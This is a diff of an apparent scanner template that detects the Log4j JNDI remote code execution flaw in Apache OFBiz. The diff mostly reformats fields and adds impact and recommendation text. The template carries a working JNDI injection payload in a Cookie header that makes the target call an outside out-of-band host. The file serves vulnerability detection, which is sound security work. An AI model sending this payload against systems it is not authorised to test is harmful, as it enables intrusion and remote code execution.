@@ -1,16 +1,15 @@
 id: apache-ofbiz-log4j-rce
-
 info:
   name: Apache OFBiz - JNDI Remote Code Execution (Apache Log4j)
   author: pdteam
   severity: critical
-  description: |
-    Apache OFBiz is affected by a remote code execution vulnerability in the bundled Apache Log4j logging library. Apache Log4j is vulnerable due to insufficient protections on message lookup substitutions when dealing with user controlled input. A remote, unauthenticated attacker can exploit this, via a web request, to execute arbitrary code with the permission level of the running Java process.
+  description: Apache OFBiz is vulnerable to a remote code execution attack through
+    Apache Log4j due to insufficient message lookup protections.
   reference:
-    - https://issues.apache.org/jira/browse/OFBIZ-12449
-    - https://ofbiz.apache.org/
-    - https://logging.apache.org/log4j/2.x/security.html
-    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  - https://issues.apache.org/jira/browse/OFBIZ-12449
+  - https://ofbiz.apache.org/
+  - https://logging.apache.org/log4j/2.x/security.html
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
   remediation: Upgrade to Apache OFBiz version 8.12.03 or later.
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
@@ -19,32 +18,35 @@ info:
     cwe-id: CWE-77
   metadata:
     shodan-query: http.html:"Apache OFBiz"
+    impact: The remote code execution vulnerability in Apache OFBiz's bundled Apache
+      Log4j logging library can allow an unauthenticated attacker to execute arbitrary
+      code with the permission level of the running Java process, potentially resulting
+      in significant impact.
+    recommendation: It is recommended to patch the Apache OFBiz software as soon as
+      possible to mitigate the risk of remote code exploitation via Apache Log4j.
   tags: cve,cve2021,ofbiz,oast,log4j,rce,apache,jndi,kev
-
 requests:
-  - raw:
-      - |
-        GET /webtools/control/main HTTP/1.1
-        Host: {{Hostname}}
-        Cookie: OFBiz.Visitor=${jndi:ldap://${hostName}.{{interactsh-url}}}
+- raw:
+  - 'GET /webtools/control/main HTTP/1.1
 
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol  # Confirms the DNS Interaction
-        words:
-          - "dns"
+    Host: {{Hostname}}
 
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+    Cookie: OFBiz.Visitor=${jndi:ldap://${hostName}.{{interactsh-url}}}
 
-    extractors:
-      - type: regex
-        part: interactsh_request
-        group: 1
-        regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
-
-# Enhanced by mp on 2022/05/27
+    '
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+    - dns
+  - type: regex
+    part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+  extractors:
+  - type: regex
+    part: interactsh_request
+    group: 1
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
